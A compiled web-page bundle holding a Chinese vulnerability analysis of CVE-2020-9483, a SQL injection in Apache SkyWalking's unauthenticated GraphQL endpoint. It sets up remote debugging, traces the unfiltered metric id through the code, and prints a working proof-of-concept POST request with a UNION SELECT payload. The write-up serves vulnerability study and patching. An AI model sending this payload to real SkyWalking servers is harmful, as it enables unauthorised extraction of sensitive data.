import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as a,d as n,e as r}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=e("p",null,"腾讯安全威胁情报中心监测到Apache SkyWalking发布更新，修复了一个SQL注入漏洞（编号：CVE-2020-9483）。远程攻击者可通过Apache SkyWalking默认开放的未授权GraphQL接口构造恶意请求包进行注入攻击，成功利用此漏洞可造成敏感数据泄漏。该漏洞等级为高危，腾讯安全专家建议相关企业尽快修复。",-1),p=e("h2",{id:"环境搭建",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#环境搭建","aria-hidden":"true"},"#"),a(" 环境搭建")],-1),g={href:"https://archive.apache.org/dist/skywalking/6.5.0/apache-skywalking-apm-6.5.0.tar.gz",target:"_blank",rel:"noopener noreferrer"},v={href:"https://archive.apache.org/dist/skywalking/8.3.0/apache-skywalking-apm-6.5.0-src.tgz",target:"_blank",rel:"noopener noreferrer"},h=r(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache SkyWalking 6.0.0~6.6.0
Apache SkyWalking 7.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,3),b={href:"http://oapService.sh",target:"_blank",rel:"noopener noreferrer"},m=r(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>for i in &quot;$OAP_HOME&quot;/oap-libs/*.jar
do
    CLASSPATH=&quot;$i:$CLASSPATH&quot;
done

OAP_OPTIONS=&quot; -Doap.logDir=\${OAP_LOG_DIR}&quot;

eval exec &quot;\\&quot;$_RUNJAVA\\&quot; \${JAVA_OPTS} \${OAP_OPTIONS} -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -classpath $CLASSPATH org.apache.skywalking.oap.server.starter.OAPServerStartUp \\
        2&gt;\${OAP_LOG_DIR}/oap.log 1&gt; /dev/null &amp;&quot;

if [ $? -eq 0 ]; then
    sleep 1
	echo &quot;SkyWalking OAP started successfully!&quot;
else
	echo &quot;SkyWalking OAP started failure!&quot;
	exit 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>配置IDEA JVM Debug</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251616557.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看CVE的修复commit寻找修复的地方</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251616973.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>打下断点并发送Payload请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /graphql HTTP/1.1
Host:
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cache-Control: max-age=0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Length: 416

{
    &quot;query&quot;: &quot;query queryData($duration: Duration!) {globalP99: getLinearIntValues(metric: {name: \\&quot;all_p99\\&quot;, id: \\&quot;&#39;) UNION ALL SELECT NULL,CONCAT(&#39;~&#39;, H2VERSION(), &#39;~&#39;)--\\&quot; }, duration: $duration) {  values { value } }}&quot;,
    &quot;variables&quot;: {
        &quot;duration&quot;: {
            &quot;end&quot;: &quot;2020-08-07 1418&quot;,
            &quot;start&quot;: &quot;2020-08-07 1417&quot;,
            &quot;step&quot;: &quot;MINUTE&quot;
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251617073.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在 org.apache.skywalking.oap.query.graphql.resolver 中我们可以看到参数 metrics.getId() 没有过滤就直接传入 getLinearIntValues</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251617628.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>跟随来到 org.apache.skywalking.oap.server.core.query.MetricQueryService.getLinearIntValues(MetricQueryService.java:96)</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251617333.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>来到 org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao.H2MetricsQueryDAO.getLinearIntValues(H2MetricsQueryDAO.java:117)，这里就将拼接的语句带入数据库进行查询，造成SQL注入</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251617486.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>调用栈如下</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>getLinearIntValues:117, H2MetricsQueryDAO (org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao)
getLinearIntValues:96, MetricQueryService (org.apache.skywalking.oap.server.core.query)
getLinearIntValues:60, MetricQuery (org.apache.skywalking.oap.query.graphql.resolver)
execute:87, GraphQLQueryHandler (org.apache.skywalking.oap.query.graphql)
doPost:81, GraphQLQueryHandler (org.apache.skywalking.oap.query.graphql)
doPost:54, JettyJsonHandler (org.apache.skywalking.oap.server.library.server.jetty)
service:101, JettyJsonHandler (org.apache.skywalking.oap.server.library.server.jetty)
service:105, JettyJsonHandler (org.apache.skywalking.oap.server.library.server.jetty)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16);function k(y,q){const i=s("ExternalLinkIcon");return l(),d("div",null,[c,u,p,e("p",null,[e("a",g,[a("https://archive.apache.org/dist/skywalking/6.5.0/apache-skywalking-apm-6.5.0.tar.gz"),n(i)])]),e("p",null,[e("a",v,[a("https://archive.apache.org/dist/skywalking/8.3.0/apache-skywalking-apm-6.5.0-src.tgz"),n(i)])]),h,e("p",null,[a("下载编译好的源码后，进入bin目录，修改 "),e("a",b,[a("oapService.sh"),n(i)]),a(" 通过IDEA进行远程调试")]),m])}const x=t(o,[["render",k],["__file","Apache SkyWalking 7.0.0 graphql SQL注入漏洞 CVE-2020-9483.html.vue"]]);export{x as default};
